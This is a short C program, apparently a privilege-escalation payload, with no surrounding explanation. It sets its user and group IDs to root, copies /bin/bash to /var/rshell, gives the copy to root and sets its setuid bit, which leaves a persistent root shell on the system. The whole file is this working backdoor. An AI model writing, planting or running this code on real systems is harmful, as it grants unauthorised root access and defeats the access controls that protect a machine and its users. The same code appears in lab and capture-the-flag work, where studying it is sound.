#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("cp /bin/bash /var/rshell");
    system("chown root:root /var/rshell");
    system("chmod u+s /var/rshell");
    return 0;
}
